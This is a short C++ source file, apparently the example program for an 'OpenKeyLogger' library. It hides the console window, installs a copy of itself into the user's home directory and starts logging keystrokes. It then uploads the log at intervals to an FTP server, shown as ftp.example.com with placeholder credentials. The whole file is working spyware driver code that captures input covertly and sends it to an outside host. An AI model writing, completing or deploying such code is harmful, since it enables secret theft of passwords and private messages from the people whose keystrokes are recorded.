/*
Example standalone program using the KeyLogger class
*/

#include "keylogger.h"

using namespace std;

//avoids showing console
int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
{
    //get an instance of KeyLogger
    KeyLogger* kl = KeyLogger::getInstance();

    /*On first run, installs the keylogger in the indicated full path and exits
    On next run, this will do nothing*/
    kl->install(kl->getUserHomeDirectory() + "OpenKeyLogger.exe");
    
    //setup FTP. The log file will be uploaded to the server every UPLOAD_DELTA seconds (defined in keylogger.h)
    kl->setMaster("ftp.example.com", 21, "user", "pass");

    //start logging
    kl->listen();

    //message loop
    kl->loop();

    return 0;
}